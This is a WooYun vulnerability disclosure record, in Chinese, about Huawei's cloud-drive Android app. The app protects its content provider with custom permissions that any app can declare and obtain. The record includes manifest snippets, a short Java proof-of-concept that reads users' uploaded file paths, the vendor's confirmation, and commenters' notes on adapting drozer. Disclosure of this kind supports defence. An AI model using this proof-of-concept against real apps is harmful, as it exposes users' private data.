{"id": 56474, "wybug_id": "wooyun-2014-057590", "wybug_title": "华为网盘content provider组件可能泄漏用户信息", "wybug_corp": "华为技术有限公司", "wybug_author": "瘦蛟舞", "wybug_date": "2014-05-12 17:49", "wybug_open_date": "2014-08-10 17:50", "wybug_type": "用户敏感数据泄漏", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全", "手机软件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向公众公开  简要描述： 华为网盘content provider组件可能泄漏用户信息 详细说明：  1.查看配置文件，还是做了防护的\n<provider android:authorities=\"com.huawei.dbank.v7.provider.DbankGallery\" android:name=\"com.huawei.dbank.v7.service.data.album.GalleryProvider\" android:readPermission=\"com.huawei.dbank.v7.provider.DbankGallery.READ_DATABASE\" android:writePermission=\"com.huawei.dbank.v7.provider.DbankGallery.WRITE_DATABASE\"/>        <provider android:authorities=\"com.huawei.dbank.v7.provider.DBank\" android:name=\".service.data.DBankProvider\" android:readPermission=\"com.huawei.dbank.v7.provider.DBank.READ_DATABASE\" android:writePermission=\"com.huawei.dbank.v7.provider.DBank.WRITE_DATABASE\"/>\n2.但是如果在manifest中做如下权限申明依旧可以同过content provider组件访问网盘sqlite中的数据\n<uses-permission android:name=\"com.huawei.dbank.v7.provider.DBank.READ_DATABASE\"/>    <uses-permission android:name=\"com.huawei.dbank.v7.provider.DBank.WRITE_DATABASE\"/>    <permission android:name=\"com.huawei.dbank.v7.provider.DBank.READ_DATABASE\" android:protectionLevel=\"dangerous\"></permission>    <permission android:name=\"com.huawei.dbank.v7.provider.DBank.WRITE_DATABASE\" android:protectionLevel=\"dangerous\"></permission>\n3.反编译app后查看uri\n\n   漏洞证明：  4.poc如下\npublic void dbank(View v){\t\tContentResolver content = getContentResolver();\t\tUri uri = Uri.parse(\"content://com.huawei.dbank.v7.provider.DBank/uploaditem\");\t\tCursor cursor = content.query(uri, null, null, null, null);\t\twhile(cursor.moveToNext()){\t\t\tString path = cursor.getString(cursor.getColumnIndex(\"filePath\"));\t\t\tSystem.out.println(\"path=\"+path);\t\t}\n5.查看用户上传的文件路径。\n\n   修复方案：     版权声明：转载请注明来源 瘦蛟舞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2014-05-13 12:05 厂商回复： 感谢白帽子提醒！不涉及文件内容泄露，产品修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-14 13:16 |    \t\tConer \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        )\t\t \n  这是一种很典型的权限泄露，自己定义了私有权限，却没有限制为同一签名才能共享权限，所以反编译之后，拿到权限的名称，就直接可以使用该权限，这种问题，貌似drozer等工具还没有支持吧，android的权限问题占了android app 漏洞的很大一部分比例    \n     2014-12-14 14:43 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:66        | 铁甲依然在)\t\t \n  @Coner 可以重新编译drozer客户端加入权限。    \n     2014-12-14 16:12 |    \t\tConer \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        )\t\t \n  @瘦蛟舞 是的，之前只是考虑到有这种问题，但是没有考虑到跟工具配合，THX to 瘦蛟舞 :)    \n     2015-04-13 22:47 |    \t\tchavez_wang \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 走过你来时的路)\t\t \n  @瘦蛟舞 请教大牛，怎么重新编译drozer客户端呢？    \n     2015-04-14 10:36 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:66        | 铁甲依然在)\t\t \n  @chavez_wang 有源码的呀.https://github.com/mwrlabs/drozer-agent    \n     2015-04-14 21:25 |    \t\tchavez_wang \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 走过你来时的路)\t\t \n  @瘦蛟舞 明白了~   点赞！    \n     2015-04-15 19:33 |    \t\tchavez_wang \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 走过你来时的路)\t\t \n  @瘦蛟舞 试了下，发现drozer-agent依赖的jdiesel在导入eclipse中后找不到com.mwr.jdiesel.api.Protobuf.Message.Argument这个类，github找了也没有，这该如何是好？    \n     2015-04-18 22:13 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:68        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  @chavez_wang @瘦蛟舞 之前也遇到类似的问题- -好像是某个依赖包有问题？    \n     2015-04-25 09:00 |    \t\tchavez_wang \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 走过你来时的路)\t\t \n  @Nicky 嗯，是jdiesel这个包的问题    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}